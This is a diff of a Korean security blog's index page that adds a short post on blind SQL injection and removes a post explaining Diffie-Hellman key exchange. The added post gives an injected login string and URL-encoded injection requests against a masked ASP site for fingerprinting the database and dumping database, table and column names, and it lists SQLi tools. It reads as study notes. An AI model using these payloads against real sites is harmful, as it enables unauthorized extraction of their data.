@@ -9,7 +9,9 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="찰리 밀러의 발표 Dissecting The Android Bouncer 를 읽어보았다. Android Bouncer 마켓에 제출된 App 에 대한 자동화된 스캐닝을 수행하는 서비스. Malware 나 스파이웨어, Trojan 을 찾기 위함. &hellip;">
+  <meta name="description" content="Blind SQL injection Case UNAME = "' or (ascii(substr(select user(),1,1))&gt;63) --"
+PASS = ""
+QUERY = "select * from users where uname='" +UNAME+ "' &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -65,6 +67,110 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/06/14/blind-sql-injection/">Blind SQL Injection</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-06-14T01:49:20+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>1:49 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h4>Blind SQL injection</h4>
+
+<p>Case</p>
+
+<pre><code>UNAME = "' or (ascii(substr(select user(),1,1))&gt;63) --"
+PASS = ""
+QUERY = "select * from users where uname='" +UNAME+ "' and pass='" +PASS+ "'"
+</code></pre>
+
+<p>이런 상황에서 QUERY 는 다음과 같이 eval 된다.</p>
+
+<pre><code>select * from users where uname='' or (ascii(substr(select user(),1,1))&gt;63) --' and pass=''
+</code></pre>
+
+<p><code>uname=''</code> 을 만족하는 row 는 없을테니, <code>or</code> 뒷부분에 따라, 전체 query 의 결과가 달라진다.
+이 차이가 HTTP Response Code 로 나타날 수도 있고, data 의 내용에 차이가 생길수도 있다.
+SQL WaitFor 로 Delay 를 삽입할 수도 있다.
+Query 결과가 화면에 덤프되지는 않지만, 이런 미세한 차이를 보고 query 의 결과값을 추측하는 것이다.</p>
+
+<p>우선 DB 종류를 확인.</p>
+
+<pre><code>http://xxx.xxx.com/abc.asp?idConc=555%27%20or%20ascii(substring((select%20@@version),1,1))=94--
+</code></pre>
+
+<p>DB 이름을 덤프.</p>
+
+<pre><code>http://xxx.xxx.com/abc.asp?idConc=555%27%20or%20ascii(substring((select%20DB_NAME(0)),1,1))=94--
+</code></pre>
+
+<p>TABLE 을 덤프.</p>
+
+<pre><code>http://xxx.xxx.com/abc.asp?idConc=555%27%20or%20ascii(substring((select%20top%201%20TABLE_NAME%20from%20INFORMATION_SCHEMA.TABLES),1,1))=94--
+</code></pre>
+
+<p>TABLE schema 를 덤프.</p>
+
+<pre><code>select top 1 COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='xxx_acesso';
+</code></pre>
+
+<p>그럼 쓸만한 query 들을 얻기 위해, Havij 가 사용하는 SQL query 들을 분석하도록 한다.</p>
+
+<h4>Havij</h4>
+
+<ul>
+<li><a href="http://www.troyhunt.com/2012/10/hacking-is-childs-play-sql-injection.html">Hacking is child&rsquo;s play - SQL injection with Havij by 3 year old</a></li>
+<li><a href="http://www.youtu.be/Fp47G4MQFvA">YouTube: Hacking is child&rsquo;s play - SQL injection with Havij by 3 year old</a></li>
+</ul>
+
+
+<h4>BBQSQL</h4>
+
+<ul>
+<li><a href="http://www.youtube.com/watch?v=Dh9Pa0kDfsc">DEFCON 20: Rapid Blind SQL Injection</a></li>
+<li><a href="https://github.com/Neohapsis/bbqsql">bbqsql github repo</a></li>
+</ul>
+
+
+<h4>SQL injection 에 관해 읽을만한 글은</h4>
+
+<ul>
+<li><a href="https://media.blackhat.com/bh-us-12/Turbo/Galbreath/BH_US_12_Galbreath_Libinjection_Slides.pdf">libinjection</a></li>
+<li><a href="http://www.slideshare.net/nickgsuperstar/new-techniques-in-sql-obfuscation">New Techniques in SQLi Obfuscation</a></li>
+</ul>
+
+
+<h4>Tools</h4>
+
+<ul>
+<li>bbqsql</li>
+<li>sqlmap</li>
+<li>sqlninja</li>
+<li>BSQL Hacker</li>
+<li>the Mole</li>
+<li>Havij</li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -763,68 +869,6 @@ pflOldProtect [out]
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/05/09/the-diffie-hellman-protocol/">The Diffie Hellman Protocol</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-05-09T19:54:33+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>7:54 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>큰 소수 p 를 정한다. (e.g. 600 digits -> approx. 2000 bits)</p>
-
-<p>{1,&hellip;,p} 중에서 정수 하나를 고른다. g.</p>
-
-<ol>
-<li>Alice : choose random a in {1,&hellip;,p-1}</li>
-<li>send A = g<sup>a</sup> (mod p) to Bob</li>
-<li>Bob: choose random b in {1,&hellip;,p-1}</li>
-<li>send B = g<sup>b</sup> (mod p) to Alice</li>
-<li>Shared key = g<sup>ab</sup> (mod p)</li>
-</ol>
-
-
-<p>Eavesdropper sees: p,g, A = g<sup>a</sup> (mod p), and B = g<sup>b</sup> (mod p)</p>
-
-<p>저 정보를 가지고 g<sup>ab</sup> (mod p) 를 계산할 수 있을까?</p>
-
-<p>Physical 한 예를 들어본다.</p>
-
-<p>e.g. 열쇠를 공유하지 않고 상자의 내용물을 안전하게 지키면서 deliver 하고 싶다.</p>
-
-<ol>
-<li>Alice 는 상자에 자신의 열쇠로 잠궈서 Bob 에게 보낸다.</li>
-<li>상자를 받은 Bob 역시 자신의 열쇠로 잠궈서 Alice 에서 다시 보낸다.</li>
-<li>Alice 는 상자를 잠근 두 개의 Lock 중에서 자신이 잠근 Lock 을 자신의 열쇠로 풀어서, 다시 Bob 에게 보낸다.</li>
-<li>Bob 은 상자를 잠근 자신의 Lock 을 푼다.</li>
-</ol>
-
-
-<p>중간에 상자를 가로채더라도 Eavesdropper 는 상자의 Lock 을 해제할 수 없다.</p>
-
-<p>수학적으로 열쇠를 채우는 연산은 exp + mod prime 연산인데, 이게 왜 계산이 어려운지 설명해보겠다.</p>
-
-<p>예를 들어 32478543<sup>743921429837645</sup> 의 remainder 를 찾는 문제를 생각해보자.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/15">&larr; Older</a>
@@ -842,6 +886,10 @@ pflOldProtect [out]
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/01/15/tf-idf/">TF-IDF</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/01/13/android-hackers-handbook/">Android Hacker's Handbook</a>
       </li>
     
@@ -855,10 +903,6 @@ pflOldProtect [out]
     
       <li class="post">
         <a href="/blog/2016/01/11/sock-sendpage/">Sock_sendpage</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/12/23/on-the-juniper-backdoor/">On the Juniper Backdoor</a>
       </li>
     
   </ul>
